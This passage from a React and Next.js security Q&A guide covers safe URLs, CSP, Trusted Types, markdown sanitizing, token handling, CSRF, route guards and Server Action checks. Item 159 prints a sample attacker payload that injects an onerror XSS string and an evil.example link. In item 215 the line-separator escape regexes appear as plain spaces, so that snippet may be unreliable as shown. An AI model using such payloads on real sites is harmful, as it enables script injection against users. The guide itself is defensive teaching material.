    node.setAttribute("rel", "noopener noreferrer");
  }
});
```

Hooks are global for that DOMPurify instance, so add them once at startup, not inside a component.

## 155: How do you validate a user-provided URL before using it in href?

Parse it with `URL`, then allow only certain protocols. Return a safe fallback otherwise.

```tsx
const ALLOWED = new Set(["http:", "https:", "mailto:"]);

export function safeHref(input: string): string {
  try {
    const url = new URL(input, window.location.origin);
    return ALLOWED.has(url.protocol) ? url.href : "#";
  } catch {
    return "#";
  }
}

<a href={safeHref(profile.website)}>Website</a>;
```

This works on all React versions and also blocks `data:` and other unwanted schemes.

## 156: Which props does React 19 protect against javascript: URLs, and what does it not cover?

React 19 checks URL props it sets, such as `href` on links and areas, `src`, `action` on forms and `formAction` on buttons and inputs. A `javascript:` value is replaced with a `javascript:` URL that only throws an error.

It does not cover:

- URLs you set yourself through refs or `window.location`.
- HTML inserted with `dangerouslySetInnerHTML`.
- Other dangerous schemes like `data:` in some places.
- Links to harmful but normal `https:` sites.

## 157: Are data: URLs dangerous in React apps?

They can be. A `data:text/html,...` URL contains a whole HTML page. Modern browsers block top-level navigation to `data:` URLs, which limits phishing. But `data:` URLs inside an iframe `src` or an `<object>` can still show attacker content, and `data:image/svg+xml` in some contexts can carry scripts. Allow `data:` only for images you create yourself, and use a protocol allowlist for user URLs.

## 158: How do you make props spreading safe in a wrapper component?

Take out the props you control and only forward a known set, or type the props tightly so callers can't pass anything unexpected.

```tsx
type ButtonProps = {
  variant?: "primary" | "secondary";
  onClick?: () => void;
  children: React.ReactNode;
  disabled?: boolean;
};

export function Button({ variant = "primary", ...rest }: ButtonProps) {
  return <button className={`btn btn-${variant}`} {...rest} />;
}
```

Here `rest` can only contain the listed props. Avoid typing it as `React.HTMLAttributes` plus spreading raw data from APIs.

## 159: Give an example of how spreading API data into a component leads to XSS.

```jsx
// Server returns user-editable "card settings"
const settings = await fetch("/api/card-settings").then((r) => r.json());

function Card() {
  return <a {...settings}>Open</a>;
}
// Attacker saves:
// { "href": "https://evil.example", "dangerouslySetInnerHTML": { "__html": "<img src=x onerror=alert(1)>" } }
```

The fix is to pick fields and validate them:

```jsx
<a href={safeHref(settings.link)} title={settings.title}>
  Open
</a>
```

## 160: How do you safely change DOM text through a ref?

Use `textContent`, which treats the value as plain text, instead of `innerHTML`.

```jsx
function Counter({ label }) {
  const ref = useRef(null);
  useEffect(() => {
    ref.current.textContent = label; // safe
  }, [label]);
  return <span ref={ref} />;
}
```

In most cases you do not need a ref for this at all; render `{label}` in JSX.

## 161: What are the risks of using non-React DOM libraries through refs?

Older libraries (jQuery plugins, some chart, editor or tooltip libraries) often build HTML from strings. When you pass them user data, they may insert it with `innerHTML` without escaping. Check how the library renders data, look for "html" options (like `html: true` in tooltips), escape or sanitize values before passing them, and keep the library updated.

## 162: Which DOM APIs should you avoid with user data inside effects?

- `element.innerHTML`, `outerHTML`
- `insertAdjacentHTML`
- `document.write`
- `Range.createContextualFragment`
- `element.setAttribute('on...')`, `setAttribute('href', ...)` without checking
- `eval`, `new Function`, string `setTimeout`
- `script.src` or `iframe.src` with user URLs

If you need any of them, sanitize or validate first, or better, render with JSX.

## 163: How do you add a CSP to a Vite React SPA?

The best way is to set the header on your hosting or server. For example, with a static host that supports a `_headers` file:

```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self' https://api.example.com; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
```

A built Vite app loads its scripts from files, so `script-src 'self'` works without `'unsafe-inline'`. Vite's dev server injects inline styles and scripts, so test the CSP against the production build.

## 164: How do you add a nonce-based CSP in Next.js?

Create a nonce per request in `proxy.ts` (called `middleware.ts` before Next.js 16), set it in the CSP header, and pass it on a request header. Next.js reads the nonce from the CSP and adds it to its own scripts.

```ts
// proxy.ts
import { NextRequest, NextResponse } from "next/server";

export function proxy(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
  const csp = `default-src 'self'; script-src 'self' 'nonce-${nonce}' 'strict-dynamic'; style-src 'self' 'nonce-${nonce}'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`;

  const headers = new Headers(request.headers);
  headers.set("x-nonce", nonce);
  headers.set("Content-Security-Policy", csp);

  const response = NextResponse.next({ request: { headers } });
  response.headers.set("Content-Security-Policy", csp);
  return response;
}
```

Your own scripts can read it with `(await headers()).get('x-nonce')`.

## 165: How do you give your own script tags a nonce in React?

React supports the `nonce` prop on `<script>` and `<style>`, and server rendering APIs accept a `nonce` option for the scripts they inject.

```jsx
<script nonce={nonce} src="https://analytics.example/a.js" async />
```

```js
renderToPipeableStream(<App />, {
  nonce,
  bootstrapScripts: ["/main.js"],
});
```

The nonce must come from the same request that set the CSP header.

## 166: How do CSS-in-JS libraries conflict with a strict CSP?

Runtime CSS-in-JS libraries (styled-components, Emotion) insert `<style>` tags at runtime. A strict `style-src` without `'unsafe-inline'` blocks them unless they carry the nonce. Emotion lets you pass a nonce to its cache:

```jsx
import createCache from "@emotion/cache";
import { CacheProvider } from "@emotion/react";

const cache = createCache({ key: "css", nonce });
<CacheProvider value={cache}>
  <App />
</CacheProvider>;
```

styled-components reads a global `__webpack_nonce__`. Without nonce support, teams often fall back to `style-src 'unsafe-inline'`.

## 167: Why do static CSS tools make CSP easier?

Tailwind CSS, CSS Modules, vanilla-extract and similar tools produce `.css` files at build time. The browser loads them like any other file, so `style-src 'self'` is enough and you do not need nonces or `'unsafe-inline'` for styles. This is one of the security reasons many teams moved away from runtime CSS-in-JS.

## 168: What is CSP report-only mode?

`Content-Security-Policy-Report-Only` makes the browser report violations without blocking anything. You can roll out a new policy, collect reports, fix what breaks, and then switch to the enforcing header.

```
Content-Security-Policy-Report-Only: script-src 'self'; report-to csp
Reporting-Endpoints: csp="https://example.com/csp-reports"
```

The older `report-uri` directive is still widely used and works alongside `report-to`.

## 169: What does 'strict-dynamic' do in a CSP?

With `'strict-dynamic'`, a script that is trusted (by nonce or hash) can load more scripts, and those are trusted too. Host allowlists like `https://cdn.example.com` are then ignored in browsers that support it. This works well for apps that load code-split chunks or third-party loaders, because you only need to put a nonce on the first script.

```
script-src 'nonce-abc123' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

## 170: How do you create a Trusted Types policy?

```js
if (window.trustedTypes?.createPolicy) {
  window.appHtmlPolicy = trustedTypes.createPolicy("app-html", {
    createHTML: (input) => DOMPurify.sanitize(input),
  });
}

// Later
element.innerHTML = window.appHtmlPolicy.createHTML(userHtml);
```

Then allow only your policies in the CSP:

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-html dompurify
```

DOMPurify can also return a `TrustedHTML` directly with `RETURN_TRUSTED_TYPE: true`.

## 171: What is the Trusted Types default policy?

A policy named `default` is called automatically when code passes a plain string to a protected sink. It lets you handle old code or libraries that you can't change, for example by sanitizing or by logging and rejecting.

```js
trustedTypes.createPolicy("default", {
  createHTML: (s) => DOMPurify.sanitize(s),
  createScriptURL: (s) => {
    const url = new URL(s, location.origin);
    if (url.origin === location.origin) return url.href;
    throw new Error("Blocked script URL: " + s);
  },
});
```

Use it as a migration tool. A default policy that returns everything unchanged removes the protection.

## 172: How do you allow HTML in react-markdown safely?

If you need raw HTML, add `rehype-raw` and always add `rehype-sanitize` after it.

```jsx
import Markdown from "react-markdown";
import rehypeRaw from "rehype-raw";
import rehypeSanitize from "rehype-sanitize";

<Markdown rehypePlugins={[rehypeRaw, rehypeSanitize]}>{userMarkdown}</Markdown>;
```

The order matters: sanitize must run after raw HTML is parsed. `rehype-sanitize` uses a GitHub-like schema by default, which you can extend for extra tags.

## 173: How do you safely render markdown with a library that outputs HTML strings?

Libraries like `marked` or `markdown-it` return HTML strings. Sanitize the output before inserting it.

```jsx
import { marked } from "marked";
import DOMPurify from "dompurify";

function MarkdownView({ source }) {
  const html = useMemo(
    () => DOMPurify.sanitize(marked.parse(source)),
    [source],
  );
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

Sanitizing the markdown input does not work; you must sanitize the final HTML.

## 174: How do you control link and image URLs in react-markdown?

Use the `urlTransform` prop. The default, `defaultUrlTransform`, already removes dangerous protocols. You can wrap it to add your own rules, for example to block images from other domains.

```jsx
import Markdown, { defaultUrlTransform } from "react-markdown";

<Markdown
  urlTransform={(url, key) => {
    if (key === "src" && !url.startsWith("https://images.example.com/"))
      return "";
    return defaultUrlTransform(url);
  }}
>
  {md}
</Markdown>;
```

You can also use the `components` prop to render all links with your own `SafeLink`.

## 175: How do you check a third-party React component for security problems?

- Search its source for `dangerouslySetInnerHTML`, `innerHTML`, `eval` and `new Function`.
- Check if props like `html`, `label` or `formatter` accept HTML strings.
- Look at open security issues and how fast they are fixed.
- Check maintenance: last release, number of maintainers, downloads.
- Check what it loads at runtime (fonts, scripts, network calls).
- Run it with your strict CSP to see if it breaks.

## 176: How do you handle HTML output from rich text editors like TipTap, Lexical or Quill?

Treat editor output as untrusted, even if it came from your own editor, because attackers can send any HTML straight to your API. Sanitize it on the server when you save it, with an allowlist that matches the editor's features, and sanitize again or use a safe renderer when you show it. Some editors can store JSON instead of HTML, which you render with React components, avoiding raw HTML completely.

## 177: How does the "access token in memory, refresh token in httpOnly cookie" pattern work?

1. After login, the server sets the refresh token as an httpOnly, `Secure`, `SameSite` cookie scoped to the refresh endpoint.
2. The access token is returned in the response body and kept only in a JavaScript variable.
3. On page load or when the access token expires, the app calls `/auth/refresh`; the browser sends the cookie and gets a new access token.

XSS can no longer steal a long-lived token, and a page reload does not log the user out. The access token is still readable by XSS while the page is open, so keep it short-lived.

## 178: How would you write an auth provider that keeps the access token in memory?

```tsx
let accessToken: string | null = null;
export const getAccessToken = () => accessToken;

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    fetch("/auth/refresh", { method: "POST", credentials: "include" })
      .then((r) => (r.ok ? r.json() : null))
      .then((data) => {
        accessToken = data?.accessToken ?? null;
        setUser(data?.user ?? null);
      })
      .finally(() => setIsLoading(false));
  }, []);

  const logout = async () => {
    await fetch("/auth/logout", { method: "POST", credentials: "include" });
    accessToken = null;
    setUser(null);
  };

  return (
    <AuthContext.Provider value={{ user, isLoading, logout }}>
      {children}
    </AuthContext.Provider>
  );
}
```

The token is in a module variable, not in React state, so it does not show in React DevTools as easily and does not cause re-renders.

## 179: How do you attach an access token with an axios request interceptor?

```ts
import axios from "axios";
import { getAccessToken } from "./auth";

export const api = axios.create({ baseURL: "https://api.example.com" });

api.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) config.headers.Authorization = `Bearer ${token}`;
  return config;
});
```

Only attach the token to your own API. If you add it on a global instance used for third-party URLs, you will leak the token to those services.

## 180: How do you refresh the token and retry the request on a 401 with axios?

```ts
let refreshPromise: Promise<string> | null = null;

api.interceptors.response.use(
  (res) => res,
  async (error) => {
    const original = error.config;
    if (
      error.response?.status !== 401 ||
      original._retry ||
      original.url === "/auth/refresh"
    ) {
      return Promise.reject(error);
    }
    original._retry = true;

    refreshPromise ??= refreshAccessToken().finally(() => {
      refreshPromise = null;
    });

    try {
      const token = await refreshPromise;
      original.headers.Authorization = `Bearer ${token}`;
      return api(original);
    } catch (e) {
      logoutAndRedirect();
      return Promise.reject(e);
    }
  },
);
```

All failing requests wait for the same refresh call, and each request is retried only once.

## 181: How do you handle 401s with fetch instead of axios?

Write a wrapper that every API call uses.

```ts
export async function apiFetch(
  input: string,
  init: RequestInit = {},
  retry = true,
) {
  const res = await fetch(input, {
    ...init,
    headers: { ...init.headers, Authorization: `Bearer ${getAccessToken()}` },
  });

  if (res.status === 401 && retry) {
    const ok = await refreshOnce(); // shared promise, like the axios version
    if (ok) return apiFetch(input, init, false);
    logoutAndRedirect();
  }
  return res;
}
```

Remember that a request body that is a stream can only be sent once; for retries use strings, `FormData` or `Blob` bodies.

## 182: How do you avoid infinite refresh loops?

- Never run the refresh logic for the refresh endpoint itself.
- Retry each original request only once (a `_retry` flag).
- Share one refresh promise so ten 401s cause one refresh, not ten.
- If the refresh fails, clear auth state and send the user to login instead of trying again.
- Treat `403` differently from `401`; refreshing does not fix a permission problem.

## 183: What is refresh token rotation?

With rotation, every time the client uses a refresh token, the server returns a new refresh token and invalidates the old one. If an attacker steals a refresh token and uses it, the real client's next refresh uses an already-used token. The server detects this reuse and revokes the whole token family, logging out both the attacker and the user. Auth0, Okta and other providers support it.

## 184: What does it mean that Chrome defaults cookies to SameSite=Lax?

If a cookie has no `SameSite` attribute, Chromium browsers treat it as `Lax`. Chrome also has a short exception: for two minutes after a cookie is set, it is still sent on top-level cross-site POSTs, to avoid breaking some login flows. Other browsers have their own defaults. Don't rely on defaults; always set `SameSite` explicitly on auth cookies.

## 185: What is the double submit cookie pattern?

The server sets a random CSRF value in a cookie that JavaScript can read (not httpOnly). The client reads it and sends it back in a header. The server checks that the header matches the cookie. An attacker's site cannot read your cookies, so it cannot set the header.

```js
const csrf = document.cookie.match(/(?:^|; )csrf=([^;]+)/)?.[1];
fetch("/api/orders", {
  method: "POST",
  headers: { "X-CSRF-Token": csrf, "Content-Type": "application/json" },
  credentials: "include",
  body: JSON.stringify(order),
});
```

The safer variant signs the token with a server secret and ties it to the session, so an attacker who can set cookies on a subdomain can't plant a matching pair.

## 186: How does the synchronizer token pattern work in an SPA?

The server creates a CSRF token tied to the user's session and stores it on the server. The SPA gets it from an endpoint like `GET /api/csrf` (or from a meta tag in the HTML) and sends it in a header on every state-changing request. The server compares it with the stored value. It is stronger than double submit because the server keeps the truth, but it needs server-side session state.

## 187: Can a custom request header protect against CSRF?

Yes, partly. Browsers cannot send custom headers like `X-Requested-With` cross-origin without a CORS preflight, and a plain HTML form cannot set them at all. If your API requires the header and your CORS policy does not allow other origins, forged cross-site requests fail. This works only if CORS is strict. OWASP lists it as a valid defense, often combined with `SameSite` cookies.

## 188: How does axios help with CSRF tokens?

Axios can read a CSRF token from a cookie and send it in a header automatically.

```js
const api = axios.create({
  baseURL: "/api",
  withCredentials: true,
  xsrfCookieName: "XSRF-TOKEN",
  xsrfHeaderName: "X-XSRF-TOKEN",
});
```

Since axios 1.6, the token is sent only to same-origin URLs unless you set `withXSRFToken: true`. This change fixed a bug where the token leaked to other hosts. Only enable it for hosts you trust.

## 189: How do you protect routes with React Router loaders?

Check auth in the loader before the page renders, so no protected UI or data loads for unauthenticated users.

```jsx
const router = createBrowserRouter([
  {
    path: "/account",
    loader: async () => {
      const user = await getCurrentUser();
      if (!user) throw redirect("/login");
      return { user, orders: await fetchOrders() };
    },
    Component: AccountPage,
  },
]);
```

In an SPA the loader still runs in the browser, so the real check must still happen in the API that `fetchOrders` calls.

## 190: How do you use React Router middleware for auth?

Middleware (stable since 7.9, always on in v8) runs before loaders and actions for a route and its children. You can check auth once on a parent route and share the user through context.

```ts
import { createContext, redirect } from "react-router";

export const userContext = createContext<User | null>(null);

async function authMiddleware({ request, context }) {
  const user = await getUserFromSession(request);
  if (!user) throw redirect("/login");
  context.set(userContext, user);
}

export const middleware = [authMiddleware];

export async function loader({ context }) {
  const user = context.get(userContext);
  return getProjectsFor(user.id);
}
```

In framework mode with SSR, this runs on the server, so it is real access control for those loaders.

## 191: How do you write a RequireAuth route guard component?

```jsx
import { Navigate, Outlet, useLocation } from "react-router";

export function RequireAuth() {
  const { user, isLoading } = useAuth();
  const location = useLocation();

  if (isLoading) return <Spinner />;
  if (!user) {
    return <Navigate to="/login" replace state={{ from: location.pathname }} />;
  }
  return <Outlet />;
}

// <Route element={<RequireAuth />}><Route path="/settings" element={<Settings />} /></Route>
```

It improves the UX. The settings API still needs its own checks.

## 192: What is the "flash of protected content" problem and how do you avoid it?

If the auth state starts as "unknown" and a guard renders the page before the check finishes, users may briefly see protected UI, or logged-in users briefly see the login page. Fix it by having an explicit loading state and rendering a spinner until auth is known, or by checking auth in a loader or on the server before rendering. Also make sure the protected page does not fetch data before auth is confirmed.

## 193: How would you build a permission hook for role-based UI?

Base it on permissions, not raw role names, and get the permissions from the server.

```tsx
type Permission = "invoice:read" | "invoice:delete" | "user:manage";

export function useCan(permission: Permission) {
  const { user } = useAuth();
  return user?.permissions.includes(permission) ?? false;
}

function InvoiceActions({ id }: { id: string }) {
  const canDelete = useCan("invoice:delete");
  return canDelete ? (
    <button onClick={() => deleteInvoice(id)}>Delete</button>
  ) : null;
}
```

The delete API must still check `invoice:delete` for this user and this invoice.

## 194: What does server-side enforcement look like for a delete action?

The server checks authentication, permission and ownership on every request, regardless of what the UI showed.

```ts
app.delete("/api/invoices/:id", requireAuth, async (req, res) => {
  const invoice = await db.invoice.findUnique({ where: { id: req.params.id } });
  if (!invoice) return res.sendStatus(404);
  if (
    invoice.orgId !== req.user.orgId ||
    !req.user.permissions.includes("invoice:delete")
  ) {
    return res.sendStatus(403);
  }
  await db.invoice.delete({ where: { id: invoice.id } });
  res.sendStatus(204);
});
```

## 195: Does code splitting hide admin pages from regular users?

No. Lazy-loaded chunks are still public files on your server or CDN. Anyone can find their names in the main bundle or by guessing, download them and read the code, including admin API routes. Code splitting is for performance, not secrecy. If admin code itself is sensitive, put it in a separate app behind server-side auth, and in any case protect every admin API.

## 196: How do you set up Auth0 in a React SPA?

```jsx
import { Auth0Provider, useAuth0 } from "@auth0/auth0-react";

<Auth0Provider
  domain="your-tenant.us.auth0.com"
  clientId="YOUR_CLIENT_ID"
  authorizationParams={{
    redirect_uri: window.location.origin,
    audience: "https://api.example.com",
  }}
>
  <App />
</Auth0Provider>;

function Orders() {
  const { getAccessTokenSilently } = useAuth0();
  const load = async () => {
    const token = await getAccessTokenSilently();
    return fetch("/api/orders", {
      headers: { Authorization: `Bearer ${token}` },
    });
  };
}
```

The `audience` makes Auth0 return an access token for your API instead of an opaque token for Auth0 only.

## 197: What do cacheLocation and useRefreshTokens do in the Auth0 React SDK?

- `cacheLocation`: where tokens are cached. The default `'memory'` is safer against XSS; `'localstorage'` keeps users logged in across reloads but exposes tokens to scripts.
- `useRefreshTokens`: uses refresh tokens (with rotation) instead of a hidden iframe to get new tokens. This works when third-party cookies are blocked.
- `useRefreshTokensFallback`: whether to fall back to the iframe method if no refresh token is available.

A common setup is memory cache with refresh tokens, so silent login works on reload without localStorage.

## 198: How do you get a token silently with MSAL React?

```tsx
import { useMsal } from "@azure/msal-react";
import { InteractionRequiredAuthError } from "@azure/msal-browser";

function useApiToken() {
  const { instance, accounts } = useMsal();

  return async () => {
    const request = {
      scopes: ["api://my-api/Orders.Read"],
      account: accounts[0],
    };
    try {
      const result = await instance.acquireTokenSilent(request);
      return result.accessToken;
    } catch (e) {
      if (e instanceof InteractionRequiredAuthError) {
        await instance.acquireTokenRedirect(request);
      }
      throw e;
    }
  };
}
```

When silent renewal fails because the user needs to sign in again or consent, fall back to an interactive call.

## 199: Which cache locations does MSAL support, and which should you pick?

MSAL Browser can store tokens in `sessionStorage` (the default), `localStorage` or memory, set with `cache.cacheLocation`. Memory is the safest against XSS but forces more silent token calls after reload. `sessionStorage` is a middle ground. `localStorage` gives single sign-on across tabs but keeps tokens longer. Pick based on how sensitive the app is, and remember that none of these fully protects you from XSS.

## 200: How do you set up Auth.js (NextAuth v5) in the Next.js App Router?

```ts
// auth.ts
import NextAuth from "next-auth";
import GitHub from "next-auth/providers/github";

export const { handlers, auth, signIn, signOut } = NextAuth({
  providers: [GitHub],
});
```

```ts
// app/api/auth/[...nextauth]/route.ts
import { handlers } from "@/auth";
export const { GET, POST } = handlers;
```

```tsx
// app/dashboard/page.tsx
import { auth } from "@/auth";
import { redirect } from "next/navigation";

export default async function Dashboard() {
  const session = await auth();
  if (!session) redirect("/api/auth/signin");
  return <p>Hello {session.user?.name}</p>;
}
```

The secret comes from the `AUTH_SECRET` environment variable.

## 201: What is the difference between the JWT and database session strategies in Auth.js?

- **JWT strategy** (the default without a database adapter): session data is stored in an encrypted JWT inside an httpOnly cookie. No database lookups, but you can't easily revoke a single session before it expires.
- **Database strategy** (default with an adapter): the cookie holds a session ID, and session data is in your database. You can list and revoke sessions, at the cost of a lookup per request.

For apps where you need "log out from all devices", the database strategy is easier.

## 202: Walk through the authorization code flow with PKCE in a SPA.

1. The app creates a random `code_verifier` and computes `code_challenge = BASE64URL(SHA256(verifier))`.
2. It stores the verifier and a random `state`, then redirects to `/authorize` with `response_type=code`, `client_id`, `redirect_uri`, `scope`, `state`, `code_challenge` and `code_challenge_method=S256`.
3. The user logs in. The server redirects back with `?code=...&state=...`.
4. The app checks `state`, then POSTs the `code` and `code_verifier` to `/token`.
5. The server checks the verifier against the challenge and returns tokens.

Libraries handle this; you should still understand it to debug and review.

## 203: How do you generate a PKCE code challenge in the browser?

```js
function base64url(bytes) {
  return btoa(String.fromCharCode(...bytes))
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
}

export async function createPkcePair() {
  const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
  const digest = await crypto.subtle.digest(
    "SHA-256",
    new TextEncoder().encode(verifier),
  );
  const challenge = base64url(new Uint8Array(digest));
  return { verifier, challenge };
}
```

Use `crypto.getRandomValues`, never `Math.random`, for security values.

## 204: How do you log out properly in an OIDC-based React app?

1. Clear tokens and user data from memory, storage and caches like TanStack Query.
2. Revoke the refresh token or end the server session.
3. Redirect to the identity provider's end-session endpoint so the SSO session also ends; otherwise the next login is silent.
4. Use a fixed, registered post-logout redirect URL.

With Auth0: `logout({ logoutParams: { returnTo: window.location.origin } })`. With MSAL: `instance.logoutRedirect()`.

## 205: How do you sync logout across browser tabs?

Use `BroadcastChannel` (or the `storage` event) to tell other tabs to clear their state.

```js
const channel = new BroadcastChannel("auth");

export function logout() {
  clearAuthState();
  channel.postMessage({ type: "logout" });
}

channel.onmessage = (event) => {
  if (event.data?.type === "logout") {
    clearAuthState();
    window.location.assign("/login");
  }
};
```

Without this, another open tab may keep showing private data after the user logged out.

## 206: How do you implement an idle timeout in a React app?

Track user activity (mouse, keyboard, touch) and log the user out, or show a warning, after a period of no activity. The server must also expire idle sessions, because closing the laptop stops all timers.

```js
useEffect(() => {
  let timer;
  const reset = () => {
    clearTimeout(timer);
    timer = setTimeout(logout, 15 * 60 * 1000);
  };
  const events = ["mousemove", "keydown", "pointerdown"];
  events.forEach((e) => window.addEventListener(e, reset));
  reset();
  return () => {
    clearTimeout(timer);
    events.forEach((e) => window.removeEventListener(e, reset));
  };
}, []);
```

## 207: How do you debug a CORS error from a React app?

1. Read the full message in the browser console; it says which header is missing.
2. In the Network tab, check the `OPTIONS` preflight and the real request, and their response headers.
3. Check that `Access-Control-Allow-Origin` matches your exact origin (scheme, host, port).
4. If you send cookies, check `Access-Control-Allow-Credentials: true` and that the origin is not `*`.
5. Check `Access-Control-Allow-Headers` includes headers like `Authorization` and `Content-Type`.

The fix is almost always on the server. You cannot fix CORS from React code.

## 208: Why can't you use Access-Control-Allow-Origin: * with credentials?

Browsers forbid it. If `*` worked with cookies, any website could read a logged-in user's private data from your API. When a request includes credentials, the server must return the exact requesting origin and `Access-Control-Allow-Credentials: true`. The server should check that origin against an allowlist, not just copy whatever the request sent.

## 209: How do you avoid CORS problems in development with Vite?

Use Vite's dev server proxy, so the browser talks to one origin:

```js
// vite.config.js
export default {
  server: {
    proxy: {
      "/api": { target: "http://localhost:4000", changeOrigin: true },
    },
  },
};
```

Do not "fix" dev CORS issues by setting a permissive CORS policy on the real API. In production you can serve the app and API from the same domain (with a reverse proxy) to avoid CORS entirely.

## 210: How do you safely handle a returnTo parameter after login?

Accept only relative paths on your own site.

```ts
export function safeReturnTo(value: string | null, fallback = "/") {
  if (!value) return fallback;
  try {
    const url = new URL(value, window.location.origin);
    if (url.origin !== window.location.origin) return fallback;
    return url.pathname + url.search + url.hash;
  } catch {
    return fallback;
  }
}

navigate(safeReturnTo(params.get("returnTo")), { replace: true });
```

Parsing with `URL` handles tricks like `//evil.com` and `/\evil.com`, which naive string checks miss.

## 211: How do you combine React Hook Form with Zod?

```tsx
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

const schema = z.object({
  email: z.email(),
  age: z.coerce.number().int().min(18),
});
type FormValues = z.infer<typeof schema>;

export function SignupForm() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: zodResolver(schema),
  });

  return (
    <form
      onSubmit={handleSubmit((data: FormValues) => api.post("/signup", data))}
    >
      <input {...register("email")} />
      {errors.email && <span>{errors.email.message}</span>}
      <input type="number" {...register("age")} />
      <button>Sign up</button>
    </form>
  );
}
```

## 212: How do you share a validation schema between client and server?

Put the Zod schema in a shared module and use it in both places. The client uses it for user feedback, the server uses it as the real check.

```ts
// shared/schemas.ts
export const CommentSchema = z.object({
  postId: z.uuid(),
  body: z.string().trim().min(1).max(2000),
});
```

```ts
// server
const parsed = CommentSchema.safeParse(req.body);
if (!parsed.success)
  return res.status(400).json({ errors: z.flattenError(parsed.error) });
```

Sharing avoids rules drifting apart. Never assume the client already ran it.

## 213: How do you prevent mass assignment with schema validation?

Mass assignment is when the server takes the whole request body and saves it, so a user can add fields like `role: "admin"` or `isVerified: true`. Zod objects strip unknown keys by default, so parse the body and save only the parsed data. Use `z.strictObject` if you want unknown keys to cause an error instead.

```ts
const UpdateProfile = z.object({
  name: z.string().max(100),
  bio: z.string().max(500),
});
const data = UpdateProfile.parse(req.body); // "role" is dropped
await db.user.update({ where: { id: req.user.id }, data });
```

## 214: Why validate API responses on the client?

Validating responses with Zod catches unexpected shapes before they reach your components. It is mainly for reliability, but it helps security too: if a compromised or buggy API returns HTML or a `javascript:` URL in a field you expect to be a plain URL, a schema like `z.url({ protocol: /^https$/ })` rejects it before it reaches an `href`. It is not a replacement for safe rendering.

## 215: How do you safely serialize initial state into server-rendered HTML?

Escape characters that can end the script tag or break JavaScript parsing.

```js
function serializeState(state) {
  return JSON.stringify(state)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/ /g, '\\u2028')
    .replace(/ /g, '\\u2029');
}

const html = `<script>window.__INITIAL_STATE__ = ${serializeState(state)}</script>`;
```

Or use `serialize-javascript` with `{ isJSON: true }`. Another option is a `<script type="application/json">` tag read with `JSON.parse`, which still needs `<` escaped.

## 216: What data from Server Components ends up in the browser?

Anything you pass as props to a Client Component is serialized into the RSC payload and sent to the browser, even if the client component never displays it. Server Components' own variables and the code itself stay on the server. So the boundary to watch is the props of every `'use client'` component.

```tsx
// Bad: whole DB row (with passwordHash, internal notes) goes to the browser
<ProfileCard user={user} />

// Good: pass only what is shown
<ProfileCard name={user.name} avatarUrl={user.avatarUrl} />
```

## 217: How do you avoid leaking full objects to Client Components?

Create Data Transfer Objects (DTOs): functions that return only the fields the client needs.

```ts
import "server-only";

export function toPublicUser(user: DbUser) {
  return { id: user.id, name: user.name, avatarUrl: user.avatarUrl };
}
```

Use these in your data access layer so components never get raw database rows. TypeScript types help reviewers see what is exposed.

## 218: How do you add auth checks inside a Server Action?

Check the session and permission at the start of every action, because anyone can call it directly.

```ts
"use server";

import { auth } from "@/auth";
import { revalidatePath } from "next/cache";

export async function deletePost(postId: string) {
  const session = await auth();
  if (!session?.user) throw new Error("Unauthorized");

  const post = await db.post.findUnique({ where: { id: postId } });
  if (!post || post.authorId !== session.user.id) throw new Error("Forbidden");

  await db.post.delete({ where: { id: postId } });
  revalidatePath("/posts");
}
```

Checking auth in the page that renders the button is not enough.

## 219: How do you validate inputs in a Server Action?

Treat arguments as untrusted, even if TypeScript says they are a certain type, because the network does not respect TypeScript.

```ts
"use server";

const Schema = z.object({
  title: z.string().trim().min(1).max(200),
  published: z.coerce.boolean(),
});

export async function createPost(prevState: unknown, formData: FormData) {
  const session = await auth();
  if (!session?.user) return { error: "Please sign in." };

  const parsed = Schema.safeParse(Object.fromEntries(formData));
  if (!parsed.success) return { error: "Invalid input." };

  await db.post.create({ data: { ...parsed.data, authorId: session.user.id } });
  return { error: null };
}
```

## 220: How should Server Actions return errors?

Return simple, expected error values (like validation messages) as data, and let unexpected errors be thrown. In production, Next.js replaces thrown errors from the server with a generic message and a `digest` so details don't leak to the browser. Never put raw database errors, stack traces or internal IDs into returned values, because those are sent to the client as is.

## 221: How does useActionState help with Server Action errors?

`useActionState` keeps the last result of an action in state, so you can show validation errors returned by the server.

```tsx
"use client";
import { useActionState } from "react";
import { createPost } from "./actions";

export function NewPostForm() {
  const [state, formAction, isPending] = useActionState(createPost, {
    error: null,
  });
  return (
    <form action={formAction}>
      <input name="title" />
      {state.error && <p role="alert">{state.error}</p>}
      <button disabled={isPending}>Save</button>
    </form>
  );
}
```

Show only the friendly messages the action chose to return.

## 222: How do you use the server-only package in practice?

Import it at the top of every module that touches secrets, the database, or internal services.

```ts
// lib/data/users.ts
import "server-only";
import { db } from "../db";

export async function getUserForAdmin(id: string) {
  // ...
}
```

If a Client Component imports this file, even indirectly, the build fails with a clear error. It turns a quiet leak into a loud build error.

## 223: What is the client-only package?

`client-only` is the opposite of `server-only`. Importing it marks a module as browser-only, so the build fails if a Server Component imports it. It is useful for code that touches `window`, `localStorage` or browser-only SDKs, to avoid confusing server errors. It is about correctness more than security.

## 224: What is the Data Access Layer pattern recommended for Next.js?

All data reads go through a small set of server-only functions that do the auth check, the query and the DTO mapping in one place.

```ts
import "server-only";
import { cache } from "react";

export const getCurrentUser = cache(async () => {
  const session = await auth();
  if (!session?.user) return null;
  return db.user.findUnique({ where: { id: session.user.id } });
});

export async function getInvoice(id: string) {
  const user = await getCurrentUser();
  if (!user) throw new Error("Unauthorized");
  const invoice = await db.invoice.findFirst({
    where: { id, orgId: user.orgId },
  });
  return (
